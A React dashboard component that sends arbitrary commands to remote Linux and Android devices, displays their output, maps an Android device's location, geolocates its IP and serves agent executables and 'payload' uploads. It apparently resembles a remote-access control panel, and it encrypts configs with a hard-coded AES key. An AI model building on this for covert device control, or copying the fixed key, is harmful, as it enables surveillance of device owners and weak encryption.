// src/pages/Dashboard.tsx
import { useEffect, useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { ref, onValue, set, get } from "firebase/database";
import { auth, db } from "../contexts/firebase";
import LineChart from "../components/LineChart";
import ThreeDeviceScene from "../components/ThreeDeviceScene";
import "../assets/css/dashboard.css";
import PayloadUploadModal from "../components/PayloadUploadModal";
import L from "leaflet";
import "leaflet/dist/leaflet.css";

type DeviceData = {
  name?: string;
  deviceType?: string;
  ip?: string;
  signals?: Record<string, number>;
  commands?: {
    action: string,
    completedAt: number,
    errorMsg: "",
    issuedAt: string,
    output: string,
    status: "pending" | "executing" | "completed" | "error"
  }[];
  logs?: any[];
  metrics?: { ts: number; cpu?: number; mem?: number; net?: number; battery?: number }[];
  // ...other fields
}

interface IpData {
  ip: string;
  success: boolean;
  type: "IPv4" | "IPv6";
  continent: string;
  country: string;
  country_code?: string;
  region: string;
  city: string;
  postal?: string;
  latitude: number;
  longitude: number;
  timezone?: string;
  connection?: {
    asn?: number;
    isp?: string;
  };
  [key: string]: any; // For any additional fields
}

export default function DashboardPage() {
  const { deviceId } = useParams<{ deviceId: string }>();
  const navigate = useNavigate();
  const [device, setDevice] = useState<DeviceData | null>(null);
  const [loading, setLoading] = useState(true);
  const [lastCommand, setLastCommand] = useState<any | null>(null);
  const [activeTab, setActiveTab] = useState<"console" | "command" | "logs">("console");
  const [uploadOpen, setUploadOpen] = useState<string | undefined | null>(undefined)
  const [cmd, setCmd] = useState("")
  const [ipData, setIpData] = useState<IpData | null>(null);


  useEffect(() => {
    if (!deviceId || !auth.currentUser) return;
    const uid = auth.currentUser.uid;
    const deviceRef = ref(db, `users/${uid}/${deviceId}`);

    const unsub = onValue(deviceRef, (snap) => {
      setLoading(false);
      if (!snap.exists()) {
        setDevice(null);
        return;
      }
      const data = snap.val() as DeviceData;
      setDevice(data);

      // watch commands: capture latest executed command for visualization
      if (data.commands && Array.isArray(data.commands) && data.commands.length > 0) {
        const last = data.commands[data.commands.length - 1];
        setLastCommand(last);
      }
    });

    return () => unsub();
  }, [deviceId]);

  useEffect(() => {
    if (device?.ip) {
      setLoading(true)
      fetch("https://ipwho.is/" + device?.ip).then(re => {
        if (!re.ok) console.log("IP details: Network response was not ok");
        return re.json()
      }).then((data) => {
        setLoading(false);
        setIpData(data);
      })
        .catch((_) => {
          setLoading(false);
        });
    }
  }, [device?.ip])

  useEffect(() => {
    var map: L.Map;
    console.log("test", device?.commands)
    if (!loading && device?.deviceType == "android" && device?.commands?.at?.(0)?.output.startsWith("Location: ")) {
      console.log("testing", device.commands)
      const [lat, lng] = device?.commands?.at?.(0)?.output.replace("Location: ", "").split(",") as string[];
      map = L.map('map').setView([parseFloat(lat), parseFloat(lng)], 15)
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors'
      }).addTo(map);
      L.marker([parseFloat(lat), parseFloat(lng)]).addTo(map).bindPopup("Device Location").openPopup();
    }
    return () => {
      map?.remove?.();
    }
  }, [device?.commands])

  async function downloadConfig() {
    if (!deviceId || !auth.currentUser) return;
    const uid = auth.currentUser.uid;
    const config = { uid: uid, deviceId: deviceId };
    const encoder = new TextEncoder();
    const encoded = encoder.encode(JSON.stringify(config));
    // Convert your hex key to a Uint8Array
    function hexToBytes(hex: string): Uint8Array {
      const bytes = new Uint8Array(hex.length / 2);
      for (let i = 0; i < bytes.length; i++) {
        bytes[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
      }
      return bytes;
    }

    const fixedKeyHex = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6";
    const keyData = hexToBytes(fixedKeyHex);

    // Import the fixed key
    const key = await crypto.subtle.importKey(
      "raw",
      keyData as BufferSource,
      { name: "AES-GCM" },
      true,
      ["encrypt"]
    );
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const ciphertext = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoded);

    const blob = new Blob([iv, new Uint8Array(ciphertext)], { type: "application/octet-stream" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "config.enc";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  const downloadExecutable = () => {
    const link = document.createElement("a");
    link.href = "/exec"; // from public folder
    link.download = "exec";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const downloadApk = () => {
    const link = document.createElement("a");
    link.href = "/app-release.apk"; // from public folder
    link.download = "app-release.apk";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const downloadFile = (val: string) => {
    if (val == "executable") {
      switch (device?.deviceType) {
        case "linux":
          downloadExecutable()
          break;
        case "android":
          downloadApk();
          break;
        default:
          console.log("currently no other devices")
          break;
      }
    } else if (val == "encrypted") {
      switch (device?.deviceType) {
        case "linux":
          downloadConfig()
          break;
        default:
          console.log("currently no other devices")
          break;
      }
    }
  }

  function pushCommand() {
    if (!deviceId || !auth.currentUser) return;
    const uid = auth.currentUser.uid;
    const deviceRef = ref(db, `users/${uid}/${deviceId}/commands`);

    get(deviceRef).then((value) => {
      let val;
      if (Array.isArray(value)) {
        value.push({
          "action": cmd,
          "issuedAt": new Date().getTime(),
          "status": "pending",
          "output": "",
          "errorMsg": ""
        })
        val = value;
      } else {
        val = [{
          "action": cmd,
          "issuedAt": new Date().getTime(),
          "status": "pending",
          "output": "",
          "errorMsg": ""
        }]
      }
      set(deviceRef, val)
    })
  }

  if (!deviceId) return <div className="dash-empty">No device selected</div>;
  // if (loading) return <div className="dash-loading">Loading...</div>;
  if (!device) return <div className="dash-empty">Device not found</div>;

  return (
    <div className="dashboard-root">
      <header className="dash-header">
        <button className="link" onClick={() => navigate(-1)}>← Back</button>
        <div className="title">
          <h1>{device.name || deviceId}</h1>
          <div className="meta"><center>{device.deviceType?.toUpperCase()}</center></div>
        </div>
        <div className="right-controls">
          <button className="btn" onClick={() => { setUploadOpen(deviceId); console.log("hello world") }} >Flash / Upload</button>
          <button className="btn outline">Reboot</button>
        </div>
      </header>

      <main className="dash-main">
        <section className="left-col">
          <div className="card overview-card">
            <div className="card-row">
              <div>
                <div className="label">IP / Host</div>
                <div className="value">{device?.ip || "—"}</div>
              </div>
              <div>
                <div className="label">Firmware</div>
                <div className="value">{(device as any).firmware || "—"}</div>
              </div>
              <div>
                <div className="label">Uptime</div>
                <div className="value">{(device as any).uptime || "—"}</div>
              </div>
              <div>
                <div className="label">Battery</div>
                <div className="value">{device.metrics?.[device.metrics.length - 1]?.battery?.toFixed?.(2) ?? "—"}%</div>
              </div>
            </div>

            <div className="overview-actions tabs">
              <button
                className={`btn ${activeTab === "console" ? "primary" : ""}`}
                onClick={() => setActiveTab("console")}
              >
                Open Console
              </button>
              <button
                className={`btn ${activeTab === "command" ? "primary" : ""}`}
                onClick={() => setActiveTab("command")}
              >
                Send Command
              </button>
              <button
                className={`btn ${activeTab === "logs" ? "primary" : ""}`}
                onClick={() => setActiveTab("logs")}
              >
                Download Logs
              </button>
            </div>
            <div className="tab-content">
              {activeTab === "console" && (
                <>
                  <h2>Open Console</h2>
                  <p>Interact directly with your device in real time.</p>
                  {/* Your console UI here */}
                </>
              )}
              {activeTab === "command" && (
                <>
                  <h2>Send Command</h2>
                  <div className="form-group">
                    <input type="text" value={cmd} onChange={e => { setCmd(e.target.value) }} placeholder="Enter command" />
                  </div>
                  <button onClick={() => { pushCommand() }} >Execute</button>
                  <div style={{ backgroundColor: "#140827", width: "100%", padding: "5px", borderRadius: "5px", marginTop: "5px" }}>
                    <p style={{ color: device.commands?.at(0)?.output.startsWith("[STDOUT] ") ? "white" : "red" }} >{device.commands?.at(0)?.output?.replace("[STDOUT] ", "")?.replace("[STDERR] ", "").split("\n").map((d, i) => <span key={i} style={{ display: "block" }}>{d}</span>)}</p>
                  </div>
                </>
              )}
              {activeTab === "logs" && (
                <>
                  <h2>Download Logs</h2>
                  <p>Select a log type to download:</p>
                  <select className="mb-2">
                    <option>High Priority Logs</option>
                    <option>All Logs</option>
                  </select>
                  <button>Download</button>
                </>
              )}
            </div>
          </div>

          <div className="card charts-card">
            <h3>Metrics (last 10 mins)</h3>
            <LineChart
              data={device.metrics ?? []}
              keys={["cpu", "net", "battery"]}
              height={220}
            />
          </div>

          <div className="card logs-card">
            <h3>Recent Logs</h3>
            <div className="logs-list">
              {device.logs && device.logs.length > 0 ? (
                [...device.logs].reverse().slice(0, 30).map((l: any, i: number) => (
                  <div className="log-item" key={i}>
                    <div className="log-time">{new Date(l.ts || Date.now()).toLocaleTimeString()}</div>
                    <div className="log-msg">{l.msg || JSON.stringify(l)}</div>
                  </div>
                ))
              ) : (
                <div className="muted">No logs</div>
              )}
            </div>
          </div>
        </section>

        <aside className="right-col">
          <div className="card three-card">
            <h3>Live Execution Visual</h3>
            <ThreeDeviceScene trigger={lastCommand} />
          </div>

          <div className="card commands-card">
            <h3>Commands</h3>
            <div className="commands-list">
              {device.commands && device.commands.length > 0 ? (
                [...device.commands].slice(-10).reverse().map((c: any, idx: number) => (
                  <div className="cmd-item" key={idx}>
                    <div className="cmd-name">{c.action || c.name}</div>
                    <div className={`cmd-status ${c.status || "idle"}`}>{c.status || "idle"}</div>
                  </div>
                ))
              ) : <div className="muted">No commands</div>}
            </div>
          </div>

          <div className="card signals-card">
            <h3>Signals</h3>
            <div className="signals-grid">
              {device.signals ? Object.entries(device.signals).map(([k, v]) => (
                <div className="signal" key={k}>
                  <div className="skey">{k}</div>
                  <div className="sval">{v}</div>
                </div>
              )) : <div className="muted">No signals</div>}
            </div>
          </div>

          {/* Downloads card */}<div className="card downloads-card">
            <h3>Download Files</h3>
            <div className="form-group mb-2">
              <label className="label">Select Device Type</label>
              <select disabled={true}
                value={device.deviceType}
              >
                <option value="linux">Linux</option>
                <option value="android">Android</option>
                <option value="esp8266">ESP8266</option>
              </select>
            </div>

            <div className="overview-actions">
              {device.deviceType == "linux" ?
                <>
                  <button className="btn primary" onClick={() => downloadFile("executable")}>
                    Download Executable
                  </button>
                  <button className="btn primary" onClick={() => downloadFile("encrypted")}>
                    Download Config
                  </button>
                </> : device.deviceType == "android" ?

                  <button className="btn primary" onClick={() => downloadFile("executable")}>
                    Download Application
                  </button> : <></>
              }
            </div>
          </div>

          <div className="card location-card">
            <h3>Device Location</h3>
            <div id="map" style={{ height: "200px", width: "100%", display: "flex", justifyContent: "center", alignItems: "center" }}>
              <span>Location Unavailable</span>
            </div>
          </div>

          <div className="card commands-card">
            <h3>IP info<sup>{ipData?.type ? "[" + ipData.type + "]" : ""}</sup></h3>
            <div className="commands-list">
              {ipData ?
                <>
                  <div className="cmd-item" >
                    <div className="cmd-name">City</div>
                    <div className="cmd-status">{ipData.city}</div>
                  </div>
                  <div className="cmd-item" >
                    <div className="cmd-name">Region</div>
                    <div className="cmd-status">{ipData.region}</div>
                  </div>
                  <div className="cmd-item" >
                    <div className="cmd-name">Country</div>
                    <div className="cmd-status">{ipData.country}-[{ipData.country_code}]</div>
                  </div>
                  <div className="cmd-item" >
                    <div className="cmd-name">ISP</div>
                    <div className="cmd-status">{ipData.connection?.isp}</div>
                  </div>
                </> : <div className="muted">No IP data</div>}
            </div>
          </div>
        </aside>
      </main>
      {uploadOpen && <PayloadUploadModal deviceId={deviceId} onClose={setUploadOpen} />}
    </div>
  );
}
